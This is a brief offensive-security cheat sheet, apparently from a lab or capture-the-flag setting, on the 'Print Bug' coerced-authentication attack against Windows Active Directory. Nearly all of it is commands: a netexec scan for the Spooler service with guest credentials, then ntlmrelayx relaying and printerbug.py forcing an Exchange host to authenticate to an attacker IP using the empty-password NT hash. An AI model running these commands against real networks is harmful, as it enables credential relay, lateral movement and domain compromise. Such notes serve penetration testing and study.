# Print Bug

Check: 

```
$ netexec smb 192.168.23.0/24 -u 'guest' -p '' -M spooler

SPOOLER     192.168.23.146  445    EXCHANGE         Spooler service enabled
```

Exploit : 

```
$ ntlmrelayx.py -debug -t dev.cubano.local
$ python3 printerbug.py cubano.local/guest@EXCHANGE.manesec.local 10.10.16.172 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```


`31d6cfe0d16ae931b73c59d7e0c089c0` mean no password.

# Reference

+ https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn